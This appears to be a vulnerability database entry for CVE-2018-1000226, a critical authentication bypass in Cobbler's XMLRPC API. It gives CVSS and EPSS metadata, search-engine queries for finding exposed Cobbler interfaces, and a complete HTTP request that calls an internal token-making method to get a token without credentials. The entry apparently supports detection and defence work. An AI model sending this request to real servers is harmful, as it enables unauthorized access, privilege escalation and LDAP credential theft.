---
layout: post
cve_id: CVE-2018-1000226
title: Cobbler - Authentication Bypass
pcap: true
pcap_path: /pcaps/2018/CVE-2018-1000226.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2018/CVE-2018-1000226.yaml
snort2_rule: N/A
snort3_rule: N/A
author: c-sh0
severity: critical
impact: 'Unauthenticated attackers can bypass authentication to gain unauthorized
  access, leading to privilege escalation, data manipulation or exfiltration, and
  LDAP credential harvesting.

  '
remediation: 'Apply the latest security patches or updates provided by the vendor
  to fix the authentication bypass vulnerability in Cobbler.

  '
reference:
- https://github.com/cobbler/cobbler/issues/1916
- https://movermeyer.com/2018-08-02-privilege-escalation-exploits-in-cobblers-api/
- https://nvd.nist.gov/vuln/detail/CVE-2018-1000226
- https://github.com/ARPSyndicate/kenzer-templates
classification:
  cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
  cvss-score: 9.8
  cve-id: CVE-2018-1000226
  cwe-id: CWE-732
  epss-score: 0.61011
  epss-percentile: 0.98235
  cpe: cpe:2.3:a:cobblerd:cobbler:*:*:*:*:*:*:*:*
metadata:
  max-request: 1
  vendor: cobblerd
  product: cobbler
  shodan-query: http.title:"cobbler web interface"
  fofa-query: title="cobbler web interface"
  google-query: intitle:"cobbler web interface"
tags:
- cve2018
- cve
- cobbler
- auth-bypass
- cobblerd
- vuln
---

## üîç Vulnerability Description
Cobbler versions 2.6.11+, but code inspection suggests at least 2.0.0+ and possibly even older versions, may be vulnerable to an authentication bypass vulnerability in XMLRPC API (/cobbler_api) that can result in privilege escalation, data manipulation or exfiltration, and LDAP credential harvesting. This attack appear to be exploitable via "network connectivity". Taking advantage of improper validation of security tokens in API endpoints. Please note this is a different issue than CVE-2018-10931.

## üåê HTTP Request
```nohighlight
POST /cobbler_api HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0
Connection: close
Content-Length: 231
Content-Type: text/xml
Accept-Encoding: gzip

<?xml version='1.0'?>
<methodCall>
  <methodName>_CobblerXMLRPCInterface__make_token</methodName>
  <params>
    <param>
      <value>
        <string>cobbler</string>
      </value>
    </param>
  </params>
</methodCall>
```

